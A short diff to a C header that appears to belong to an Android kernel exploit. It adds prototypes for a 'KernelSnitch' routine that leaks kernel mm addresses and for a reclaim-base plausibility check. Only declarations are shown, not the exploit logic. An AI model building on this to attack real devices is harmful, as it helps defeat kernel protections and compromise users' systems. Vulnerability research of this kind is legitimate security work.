@@ -54,6 +54,9 @@
 /* Runtime skb linear-vs-pointer base adjustment (see select_skb_data_delta). */
 extern long g_skb_data_delta;
 void select_skb_data_delta(void);
+int is_plausible_reclaim_base(uintptr_t base);
+/* Double-scan KernelSnitch; returns leaked mm or (uintptr_t)-1. Does not cleanup. */
+uintptr_t kernelsnitch_stable_mm_leak(void);
 
 #define ASHMEM_NAME_LEN 256
 #define __ASHMEMIOC 0x77
@@ -347,6 +350,7 @@ void setup_kernelsnitch(void);
 int kernelsnitch_collisions_ready(void);
 void run_kernelsnitch_bruteforce(void);
 uintptr_t cleanup_kernelsnitch(void);
+/* kernelsnitch_stable_mm_leak is declared near g_skb_data_delta above */
 void close_ctx_memfds(struct mm_ctx *ctx);
 void free_ctx_storage(struct mm_ctx *ctx);
 void cleanup_page_prepare_state(void);
